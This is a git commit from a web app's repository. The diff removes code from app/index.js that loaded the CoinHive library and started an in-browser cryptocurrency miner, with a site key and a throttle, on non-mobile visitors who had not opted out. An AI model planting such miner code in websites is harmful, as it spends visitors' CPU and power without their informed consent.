c13555a3fb217eff00e68e719e3d26a7481eea1a
Christopher Jacobs <apexearth@gmail.com>
2017-12-19 13:50:52 -0800

    Go back to previous popup, but delay it by 60 seconds. Would prefer a better solution, but perhaps this is OK for now. Opt-in of some kind seems like the way to go.

--- app/index.js
+++ app/index.js
@@ -2,11 +2,3 @@ global.deploymentType = "web"
 require('./device')
 require('./ui')
 require('./FB')
-
-require('./coinhive.min')
-const miner = new CoinHive.Anonymous('1Dh4ORJkacanB4jbO47UrOVEB7aueH25', {throttle: 0.7})
-// Only start on non-mobile devices and if not opted-out
-// in the last 14400 seconds (4 hours):
-if (!miner.isMobile() && !miner.didOptOut(14400)) {
-    miner.start()
-}
